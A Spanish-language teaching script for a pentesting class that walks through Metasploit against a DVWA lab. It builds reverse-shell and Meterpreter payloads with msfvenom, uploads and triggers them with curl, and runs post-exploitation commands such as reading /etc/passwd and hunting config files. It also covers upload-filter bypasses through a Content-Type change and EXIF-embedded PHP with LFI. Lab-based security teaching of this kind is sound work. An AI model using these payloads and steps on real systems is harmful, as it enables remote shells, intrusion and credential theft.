# Guion Demo - File Upload + Metasploit
## Modulo 4 Clase 1

DVWA default: nivel low
Aliases: sshVPS (host Ubuntu) | sshKali (container Kali, TTY)

---

## Intro - Que es Metasploit

Metasploit es el framework de explotacion mas usado en pentesting.

| Herramienta  | Para que sirve                                        |
| ---          | ---                                                   |
| msfconsole   | Interfaz interactiva: exploits, listeners, auxiliares |
| msfvenom     | Generador de payloads                                 |

Flujo: msfvenom genera payload - victima lo ejecuta - se conecta al listener en Kali

---

## Comandos basicos de msfconsole

NOTA: msfconsole corre DENTRO del container Kali. sshKali te deja directo adentro.

    sshKali   (ssh -t root@92.113.34.149 docker exec -it kali-metasploit bash)
    msfconsole
    search type:exploit platform:php
    search wordpress upload
    info auxiliary/scanner/http/http_version
    msfvenom -l payloads | grep php

---

## msfvenom - Versatilidad de payloads

    msfvenom --list formats

    PHP simple (reverse shell basico):
    msfvenom -p php/reverse_php LHOST=172.21.0.6 LPORT=4444 -f raw -o /tmp/revshell.php

    PHP Meterpreter (sesion avanzada):
    msfvenom -p php/meterpreter/reverse_tcp LHOST=172.21.0.6 LPORT=4444 -f raw -o /tmp/meter.php

    Windows EXE:
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.21.0.6 LPORT=4444 -f exe -o /tmp/payload.exe

    Android APK:
    msfvenom -p android/meterpreter/reverse_tcp LHOST=172.21.0.6 LPORT=4444 -o /tmp/malicious.apk

---

## Modulos auxiliares (sin explotar nada)

NOTA: error_sql_injection requiere cookie de sesion DVWA.
Solo mostrar info, no correr. Para SQLi usar sqlmap (ya visto en M2).

    sshKali && msfconsole -q

    use auxiliary/scanner/http/http_version
    set RHOSTS juice.labs.manuel-roldan.cloud
    set RPORT 443 && set SSL true && run

    use auxiliary/scanner/http/brute_dirs
    set RHOSTS juice.labs.manuel-roldan.cloud
    set RPORT 443 && set SSL true && run

    info auxiliary/scanner/http/error_sql_injection

---

## Demo 1 - Reverse Shell Simple

### Terminal 1 - Listener

    sshKali
    msfconsole -q -x       use exploit/multi/handler; set payload php/reverse_php; set LHOST 172.21.0.6; set LPORT 4444; run

    Esperar: [*] Started reverse TCP handler on 172.21.0.6:4444
    Si puerto ocupado: pgrep -f msfconsole para obtener PID, luego matarlo

### Terminal 2 - Generar, bajar y subir

    # Generar en el container y copiar al VPS
    sshVPS docker exec kali-metasploit msfvenom -p php/reverse_php LHOST=172.21.0.6 LPORT=4444 -f raw -o /tmp/revshell.php && docker cp kali-metasploit:/tmp/revshell.php /tmp/revshell.php

    # Bajar a Mac
    scp root@92.113.34.149:/tmp/revshell.php ~/Desktop/revshell.php

    # Login en DVWA
    curl -s -c /tmp/dvwa_cookies.txt -d username=admin&password=password&Login=Login https://dvwa.labs.manuel-roldan.cloud/login.php -o /dev/null

    # Subir payload
    curl -s -b /tmp/dvwa_cookies.txt -F MAX_FILE_SIZE=100000 -F uploaded=@/tmp/revshell.php;type=application/x-php -F Upload=Upload https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/upload/ | grep succesfully

    # Trigger
    curl -s https://dvwa.labs.manuel-roldan.cloud/hackable/uploads/revshell.php -b /tmp/dvwa_cookies.txt &

### Terminal 1 - Comandos en sesion basica

    whoami && id && hostname
    ls /var/www/html/hackable/uploads/
    cat /etc/passwd

### Cleanup

    sshVPS docker exec dvwa rm /var/www/html/hackable/uploads/revshell.php

---

## Demo 2 - Meterpreter

Diferencias vs php/reverse_php:
- Corre en MEMORIA (no escribe al disco) -> mas dificil de detectar
- Comandos propios independientes del OS de la victima
- Post-explotacion: download, upload, ps, search, privesc

### Terminal 1 - Listener Meterpreter

    sshKali
    msfconsole -q -x       use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST 172.21.0.6; set LPORT 4444; run

### Terminal 2 - Generar y subir Meterpreter

    sshVPS docker exec kali-metasploit msfvenom -p php/meterpreter/reverse_tcp LHOST=172.21.0.6 LPORT=4444 -f raw -o /tmp/meter.php && docker cp kali-metasploit:/tmp/meter.php /tmp/meter.php

    scp root@92.113.34.149:/tmp/meter.php ~/Desktop/meter.php

    curl -s -b /tmp/dvwa_cookies.txt -F MAX_FILE_SIZE=100000 -F uploaded=@/tmp/meter.php;type=application/x-php -F Upload=Upload https://dvwa.labs.manuel-roldan.cloud/vulnerabilities/upload/ | grep succesfully

    curl -s https://dvwa.labs.manuel-roldan.cloud/hackable/uploads/meter.php -b /tmp/dvwa_cookies.txt &

### Terminal 1 - Comandos Meterpreter

    Al conectar: [*] Meterpreter session 1 opened

    sysinfo           info del sistema sin depender de binarios del OS
    getuid            usuario actual

    pwd               navegacion nativa de Meterpreter
    ls
    cd /var/www/html && ls

    download /etc/passwd /tmp/passwd_victima.txt        victima -> Kali
    upload /tmp/test.txt /var/www/html/hackable/uploads/test.txt    Kali -> victima

    ps                procesos en la victima

    shell             abrir shell del sistema (Ctrl+Z para volver a meterpreter)
    whoami && cat /etc/os-release
    exit

    search -f config.php
    search -f wp-config.php

    run post/multi/recon/local_exploit_suggester
    run post/linux/gather/enum_system

    DIFERENCIA CLAVE:
    php/reverse_php              -> shell basico, limitado al OS victima
    php/meterpreter/reverse_tcp  -> sesion enriquecida en memoria, post-modulos

### Cleanup Meterpreter

    sshVPS docker exec dvwa rm /var/www/html/hackable/uploads/meter.php

---

## Bonus A - Bypass nivel Medium (Burp)

    DVWA Security -> Medium -> File Upload -> subir revshell.php -> rechazado
    Burp Intercept ON -> reintentar upload
    Cambiar: Content-Type: application/x-php  -->  Content-Type: image/jpeg
    Forward -> subido OK

---

## Bonus B - Bypass nivel High (exiftool + LFI)

DVWA High usa getimagesize(): necesitas JPEG real con PHP en EXIF + LFI para ejecutarlo.

### Paso 1 - Crear payload (Mac)

    brew install exiftool
    exiftool -Comment=PHP_CODE foto.jpg -o shell_high.jpg
    Donde PHP_CODE es: php system get_cmd ;
    (escribir con tags reales al ejecutar el comando)

    exiftool shell_high.jpg | grep Comment

### Paso 2 - Subir en DVWA nivel High

    DVWA Security -> High
    File Upload -> shell_high.jpg -> ACEPTADO (getimagesize lo valida como JPEG real)

### Paso 3 - Ejecutar via LFI

    URL: dvwa.labs.manuel-roldan.cloud/vulnerabilities/fi/?page=../../hackable/uploads/shell_high.jpg&cmd=id
    Cookie: PHPSESSID=TU_SESSID; security=high

    Concepto: File Upload evade getimagesize + LFI ejecuta el PHP -> RCE combinado

### Cleanup

    sshVPS docker exec dvwa rm /var/www/html/hackable/uploads/shell_high.jpg
